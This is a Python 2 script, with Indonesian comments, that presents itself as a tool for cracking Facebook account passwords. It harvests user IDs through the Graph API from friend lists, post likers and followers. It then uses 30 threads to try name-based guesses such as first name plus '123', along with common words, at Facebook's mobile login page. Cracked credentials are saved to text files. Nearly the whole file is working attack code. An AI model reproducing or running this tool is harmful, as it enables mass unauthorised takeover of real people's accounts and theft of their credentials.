# Tools untuk crack password akun Facebook secara random
# creator EROR504
# email : eror2434@gmail.com
# whatsapp : +6281210160358
# Facebook : https://www.facebook.com/profile.php?id=100049013916432
# instagram : tidak ada
# tiktok : gk maen tiktok
# YouTube : https://youtube.com/channel/UCNUDRE4A2c9689yKdHkmKQA
# Intinya ini cuma buat senang-senang aja ya gan
import os
from os import mkdir as make
from os import system as os
import sys
from sys import exit as keluar
import time
from time import sleep as waktu
try:
    import requests
except ImportError:
    os('pip2 install requests && python2 smp.py')
from requests.exceptions import ConnectionError as galat
from requests import get as rg
from requests import post as rp
import json
import threading
from multiprocessing.pool import ThreadPool as th
logo = '\x1b[91m\n\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x9a\xe2\x95\xac\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9d\n\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x97\n\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n        \x1b[00mWhatsApp creator : +6281210160358'
id = []
crack = []
ok = []
cp = []
def menu():
    try:
        ip = rg('https://api.ipify.org').text
        country = rg('https://ipfind.co/?auth=edccd7b3-68bb-454f-b6f0-34059b61c8d1&ip=' + ip).json()
        daerah = country['country']
    except KeyError:
        pass
    except galat:
        exit('[!] Gk ada koneksi sayang')
    global token
    global pengguna
    global ids
    try:
        token = open('token.txt','r').read()
    except IOError:
        exit()
    try:
        data = rg('https://graph.facebook.com/me?access_token=' + token).json()
        pengguna = data['name']
        ids = data['id']
    except KeyError:
        print "[!] Akun kamu kayaknya kena Cp sayang"
        waktu(2)
        login()
    except galat:
        exit("[!] Tidak ada koneksi Internet")
    os('clear')
    print logo
    print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
    print "! user    : " + pengguna
    print "! Id      : " + ids
    print "! Ip      : " + ip

    print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
    print "1) crack dari daftar teman"
    print "2) crack dari daftar teman orang lain"
    print "3) crack dari postingan publik"
    print "4) crack dari file id"
    print "5) crack dari total folowers publik"
    print "0) exit tools"
    print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
    pilih_menu()

def pilih_menu():
    p = raw_input('+ Choose : ')
    if p == '1':
        try:
            get = rg('https://graph.facebook.com/me/friends?access_token=' + token).json()
        except galat:
            exit("! Tidak ada koneksi Internet")
        save_id = open('id.txt','a')
        for i in get['data']:
            id.append(i['id'])
            save_id.write(i['id'] + '\n')
        save_id.close()
    elif p == '2':
        print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
        idt = raw_input('+ Input Id Publik : ')
        try:
            get = rg('https://graph.facebook.com/' + idt + '/friends?access_token=' + token).json()
        except KeyError:
            print "! Id Tidak valid"
            waktu(2)
            menu()
        except galat:
            exit("[!] Tidak ada koneksi Internet")
        save_id = open('id.txt','a')
        for i in get['data']:
            id.append(i['id'])
            save_id.write(i['id'] + '\n')
        save_id.close()
    elif p == '3':
        print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
        idt = raw_input('+ Input Id postingan : ')
        try:
            get = rg('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token).json()
        except KeyError:
            print "\n! Id postingan Tidak valid\n"
            waktu(3)
            menu()
        except galat:
            exit('! Tidak ada koneksi Internet')
        save_id = open('id.txt','a')
        for i in get['data']:
            id.append(i['id'])
            save_id.write(i['id'] + '\n')
        save_id.close()
    elif p == '4':
        print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
        idt = raw_input('+ Input File id : ')
        try:
            for line in open(idt,'r').readlines():
                id.append(line.strip())
        except IOError:
            print "\n! File id tidak ada\n"
            waktu(3)
            menu()
    elif p == '5':
        print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
        idt = raw_input('+ Input Id Publik : ')
        try:
            get = rg('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token).json()
        except KeyError:
            print "\n! Pengguna Tidak Ditemukan\n"
            waktu(3)
            menu()
        except galat:
            exit('! Tidak Ada koneksi')
        save_id = open('id.txt','a')
        for i in get['data']:
            id.append(i['id'])
            save_id.write(i['id'] + '\n')
        save_id.close()
    elif p == '0':
        print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
        exit('\n! Lopyu all\n!Jangan lupa subrek YouTube aing slur\n')
    else:
        print "\n! Input yang bener dong sayang\n"
        pilih_menu()
    os('clear')
    print logo
    print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'
    print "! Total Id : " + str(len(id))
    print "! Proses crack sudah dimulai"
    print "! Tekan CRTL + Z untuk stop"
    print 47 * '\x1b[91m\xe2\x94\x80\x1b[00m'

    def main(arg):
        user = arg
        try:
            make('out')
        except OSError:
            pass
        try:
            get = rg('https://graph.facebook.com/' + user + '/?access_token=' + token).json()
            url = get['link']
            nik = get['name']
            pz1 = get['first_name'].lower() + get['last_name'].lower()
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz1, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                print "\x1b[92mId : " + user + " | Password : " + pz1
                a = open('out/ok.txt','a')
                a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz1 + '\nprofile : ' + url + '\n')
                a.close()
            elif 'checkpoint' in data:
                print "\x1b[93mId : " + user + " | Password : " + pz1
                a = open('out/cp.txt','a')
                a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz1 + '\nprofile : ' + url + '\n')
                a.close()
            pz2 = get['first_name'].lower() + '1'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                print "\x1b[92mId : " + user + " | Password : " + pz2
                a = open('out/ok.txt','a')
                a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz2 + '\nprofile : ' + url + '\n')
                a.close()
            elif 'checkpoint' in data:
                print "\x1b[93mId : " + user + " | Password : " + pz2
                a = open('out/cp.txt','a')
                a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz2 + '\nprofile : ' + url + '\n')
                a.close()
            pz3 = get['first_name'].lower() + '1234'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                    print "\x1b[92mId : " + user + " | Password : " + pz3
                    a = open('out/ok.txt','a')
                    a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz3 + '\nprofile : ' + url + '\n')
                    a.close()
            elif 'checkpoint' in data:
                    print "\x1b[93mId : " + user + " | Password : " + pz3
                    a = open('out/cp.txt','a')
                    a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz3 + '\nprofile : ' + url + '\n')
                    a.close()
            pz4 = get['first_name'].lower() + '12'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                    print "\x1b[92mId : " + user + " | Password : " + pz4
                    a = open('out/ok.txt','a')
                    a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz4 + '\nprofile : ' + url + '\n')
                    a.close()
            elif 'checkpoint' in data:
                    print "\x1b[93mId : " + user + " | Password : " + pz4
                    a = open('out/cp.txt','a')
                    a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz4 + '\nprofile : ' + url + '\n')
                    a.close()
            pz5 = get['first_name'].lower() + '123'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                print "\x1b[92mId : " + user + " | Password : " + pz5
                a = open('out/ok.txt','a')
                a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz5 + '\nprofile : ' + url + '\n')
            elif 'checkpoint' in data:
                 print "\x1b[93mId : " + user + " | Password : " + pz5
                 a = open('out/cp.txt','a')
                 a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz5 + '\nprofile : ' + url + '\n')
                 a.close()
            pz6 = get['first_name'].lower() + '12345'
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz6, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                 print "\x1b[92mId : " + user + " | Password : " + pz6
                 a = open('out/ok.txt','a')
                 a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz6 + '\nprofile : ' + url + '\n')
                 a.close()
            elif 'checkpoint' in data:
                 print "\x1b[93mId : " + user + " | Password : " + pz6
                 a = open('out/cp.txt','a')
                 a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz6 + '\nprofile : ' + url + '\n')
                 a.close()
            pz7 = "sayang"
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz7, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                 print "\x1b[92mId : " + user + " | Password : " + pz7
                 a = open('out/ok.txt','a')
                 a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz7 + '\nprofile : ' + url + '\n')
                 a.close()
            elif 'checkpoint' in data:
                 print "\x1b[93mId : " + user + " | Password : " + pz7
                 a = open('out/cp.txt','a')
                 a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz7 + '\nprofile : ' + url + '\n')
                 a.close()
            pz8 = "mantan"
            http = rp('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pz8, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            data = http.content
            if 'mbasic_logout_button' in data or 'save-device' in data:
                 print "\x1b[92mId : " + user + " | Password : " + pz8
                 a = open('out/ok.txt','a')
                 a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz8 + '\nprofile : ' + url + '\n')
                 a.close()
            elif 'checkpoint' in data:
                 print "\x1b[93mId : " + user + " | Password : " + pz8
                 a = open('out/cp.txt','a')
                 a.write('nama : ' + nik + '\nid : ' + user + '\npassword : ' + pz8 + '\nprofile : ' + url + '\n')
                 a.close()
        except:
            pass
    p = th(30)
    p.map(main, id)
    print 47 * '\x1b[91m\xe2\x94\x80\x1b[94m'
    print "! Crack password selesai"
    print "! Hasil crack aktif tersimpan di file out/ok.txt"
    print "! Hasil crack checkpoint tersimpan di file out/cp.txt"
    print "! Data id kami simpan di file id.txt"
    exit()
if __name__ == '__main__':
    menu()
